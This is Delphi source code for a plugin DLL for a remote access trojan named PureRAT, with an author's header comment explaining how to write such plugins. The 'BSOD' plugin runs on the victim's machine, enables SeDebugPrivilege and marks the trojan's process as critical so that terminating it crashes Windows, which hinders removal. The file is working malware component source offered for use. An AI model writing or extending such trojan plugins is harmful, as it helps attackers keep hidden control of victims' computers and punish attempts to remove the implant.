{
	This example show you how to create your own plugins for PureRAT.
	Respect everything and follow all comments to be sure that all will work fine. Thank you!
	
	-> wrh1d3
}

library BSOD;

uses
  Windows,
  SysUtils;

//Constants for plugin infos
const
  //Kind of plugin you can create for PureRAT
  PluginType: array[0..2] of string = ('Client', 'Builder', 'Server'); //(*)
  
  //Main plugin infos
  PluginName = 'BSOD';
  PluginAuthor = 'Prime02';
  PluginDescription = 'Set current process is critical';
  PluginVersion = '1.0.0.0';

  //[NOTE]
  
  {(*) PureRAT use a reverse connection model, so the client is the part
     installed on remote machine, the builder is the client builder on main application and
		 the server the main application itself}
	
//Function to retrieve plugin infos
function PluginInfos: PChar; stdcall;
begin
  Result := PChar(PluginName + '|' +
                  PluginAuthor + '|' +
                  PluginDescription + '|' +
                  PluginVersion + '|' +
                  PluginType[0] + '|'); //Specify the plugin type by index (0 -> Client)
end;
//-----

function RtlSetProcessIsCritical(unu: DWORD; proc: POinter; doi: DWORD): LongInt; stdcall;
  external 'ntdll.dll';

function NTSetPrivilege(sPrivilege: string; bEnabled: Boolean): Boolean;
var
  hToken: THandle;
  TokenPriv, PrevTokenPriv: TOKEN_PRIVILEGES;
  ReturnLength: Cardinal;
begin
  Result := False;

  if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, hToken) then
  begin
    try
      if LookupPrivilegeValue(nil, PChar(sPrivilege), TokenPriv.Privileges[0].Luid) then
      begin
        TokenPriv.PrivilegeCount := 1; 

        case bEnabled of
          True: TokenPriv.Privileges[0].Attributes  := SE_PRIVILEGE_ENABLED;
          False: TokenPriv.Privileges[0].Attributes := 0;
        end;

        ReturnLength := 0;
        PrevTokenPriv := TokenPriv;

        AdjustTokenPrivileges(hToken, False, TokenPriv, SizeOf(PrevTokenPriv),
          PrevTokenPriv, ReturnLength);
      end;
    finally
      CloseHandle(hToken);
    end;
  end;
end;

//Function to be executed
procedure PluginFunction; stdcall;
begin
	NTSetPrivilege('SeDebugPrivilege', True);
  RtlSetProcessIsCritical(1, nil, 0);
end;
//-----

// Don't edit following lines!!
exports
  PluginInfos,    //Infos about plugin
  PluginFunction;	//Function to execute

begin
end.
